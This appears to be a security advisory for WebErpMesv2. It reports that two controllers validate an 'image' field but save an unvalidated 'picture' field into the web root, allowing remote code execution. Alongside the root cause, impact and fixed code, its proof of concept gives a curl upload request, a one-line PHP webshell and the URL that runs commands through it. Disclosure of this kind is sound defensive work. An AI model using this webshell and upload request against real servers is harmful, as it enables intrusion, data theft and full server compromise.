WebErpMesv2 contains a file upload validation bypass vulnerability in multiple controllers that allows authenticated users to upload arbitrary files, including PHP scripts, leading to Remote Code Execution (RCE). This vulnerability is identical in nature to CVE-2025-52130 (GHSA-jpmf-r2gf-85wf) but exists in different code locations that were not addressed by the original fix.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Product | WebErpMesv2 |
| Vendor | SMEWebify |
| Repository | https://github.com/SMEWebify/WebErpMesv2 |
| Vulnerability Type | Unrestricted Upload of File with Dangerous Type |
| CWE | CWE-434 |
| Related CVE | CVE-2025-52130 / GHSA-jpmf-r2gf-85wf (same pattern, different location) |

## CVSS v3.1 Score: 5.4 (Medium)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`

> **Note:** This score matches CVE-2025-52130 (GHSA-jpmf-r2gf-85wf) as it is the same vulnerability pattern in different code locations.

## Affected Components

### 1. QuoteLinesController::StoreImage

**File:** `app/Http/Controllers/Workflow/QuoteLinesController.php`  
**Lines:** 97-109

```php
public function StoreImage($idQuote,Request $request)
{
    $request->validate([
        'image' => 'image|mimes:jpeg,png,jpg,gif,svg|max:10240',  // Validates 'image'
    ]);
    
    if($request->hasFile('picture')){  // Uploads 'picture' - DIFFERENT FIELD
        $QuoteLineDetails = QuoteLineDetails::findOrFail($request->id);
        $file =  $request->file('picture');
        $filename = time() . '_' . $file->getClientOriginalName();
        $request->picture->move(public_path('images/quote-lines'), $filename);
        // ...
    }
}
```

### 2. OrderLinesController::StoreImage

**File:** `app/Http/Controllers/Workflow/OrderLinesController.php`  
**Lines:** 54-66

```php
public function StoreImage($idOrder,Request $request)
{
    $request->validate([
        'image' => 'image|mimes:jpeg,png,jpg,gif,svg|max:10240',  // Validates 'image'
    ]);
    
    if($request->hasFile('picture')){  // Uploads 'picture' - DIFFERENT FIELD
        $OrderLineDetails = OrderLineDetails::findOrFail($request->id);
        $file =  $request->file('picture');
        $filename = time() . '_' . $file->getClientOriginalName();
        $request->picture->move(public_path('images/order-lines'), $filename);
        // ...
    }
}
```

## Root Cause

The validation logic checks a field named `image`, but the actual file upload processes a different field named `picture`. Since the `picture` field is never validated, an attacker can upload any file type by simply using the `picture` parameter instead of `image`.

This is the exact same vulnerability pattern that was assigned CVE-2025-52130 in `FactoryController.php`, which was fixed in commits `f0e4645a4b1e20de2458f94e82a4cea8416e3e2a` and `649bd6e5cada3a2bbb2844764a5bf7a9254d9add`. However, the same pattern in `QuoteLinesController.php` and `OrderLinesController.php` was not addressed.

## Impact

- **Remote Code Execution:** Attackers can upload PHP webshells and execute arbitrary commands on the server
- **Full System Compromise:** With RCE, attackers can access databases, steal sensitive data, pivot to internal networks
- **Low Privilege Escalation:** Any authenticated user (including lowest privilege accounts) can exploit this vulnerability
- **Direct Web Access:** Uploaded files are stored in `public_path()`, making them directly accessible via HTTP

## Proof of Concept

### Attack Steps

1. Authenticate as any user
2. Send a POST request to the vulnerable endpoint with a PHP file in the `picture` field
3. Access the uploaded file directly via the web server

### Example Request (QuoteLinesController)

```bash
curl -X POST "http://target/quotes/1/edit-detail-lines/1/image" \
  -H "Cookie: laravel_session=<session_cookie>" \
  -H "X-CSRF-TOKEN: <csrf_token>" \
  -F "picture=@shell.php;type=image/jpeg" \
  -F "id=1"
```

### Example Malicious File (shell.php)

```php
<?php system($_GET['cmd']); ?>
```

### Accessing the Shell

```
http://target/images/quote-lines/<timestamp>_shell.php?cmd=whoami
```

## Recommended Fix

Apply the same fix pattern used for CVE-2025-52130:

### QuoteLinesController.php

```php
public function StoreImage($idQuote, Request $request)
{
    $request->validate([
        'picture' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:10240',
    ]);
    
    if ($request->hasFile('picture')) {
        $file = $request->file('picture');
        $extension = $file->getClientOriginalExtension();
        $filename = time() . '_' . uniqid() . '.' . $extension;
        $file->move(public_path('images/quote-lines'), $filename);
        // ...
    }
}
```

### OrderLinesController.php

```php
public function StoreImage($idOrder, Request $request)
{
    $request->validate([
        'picture' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:10240',
    ]);
    
    if ($request->hasFile('picture')) {
        $file = $request->file('picture');
        $extension = $file->getClientOriginalExtension();
        $filename = time() . '_' . uniqid() . '.' . $extension;
        $file->move(public_path('images/order-lines'), $filename);
        // ...
    }
}
```

Key changes:
1. Validate the correct field (`picture` instead of `image`)
2. Use a generated filename instead of the original filename
3. Consider storing uploads outside the web root

## Relationship to CVE-2025-52130

This vulnerability shares the exact same root cause as CVE-2025-52130 (GHSA-jpmf-r2gf-85wf):

| Aspect | CVE-2025-52130 | This Vulnerability |
|--------|----------------|-------------------|
| Root Cause | Validates field X, uploads field Y | Validates field X, uploads field Y |
| Affected File | `FactoryController.php` | `QuoteLinesController.php`, `OrderLinesController.php` |
| Fixed | Yes (commits f0e4645, 649bd6e) | **No - still vulnerable** |
| Validated Field | `image`, `file` | `image` |
| Uploaded Field | `picture`, `cgv_file` | `picture` |

The original fix for CVE-2025-52130 only addressed `FactoryController.php`. The same vulnerable pattern in `QuoteLinesController.php` and `OrderLinesController.php` was overlooked and remains exploitable.

## References

- CVE-2025-52130 / GHSA-jpmf-r2gf-85wf: https://github.com/advisories/GHSA-jpmf-r2gf-85wf
- CVE-2025-52130 Technical Writeup: https://medium.com/@The_Hiker/wrong-variable-name-leads-to-rce-cve-2025-52130-8ff59a7d245c
- CWE-434 (Unrestricted Upload): https://cwe.mitre.org/data/definitions/434.html
- WebErpMesv2 Repository: https://github.com/SMEWebify/WebErpMesv2
- Original Fix Commits: f0e4645a4b1e20de2458f94e82a4cea8416e3e2a, 649bd6e5cada3a2bbb2844764a5bf7a9254d9add
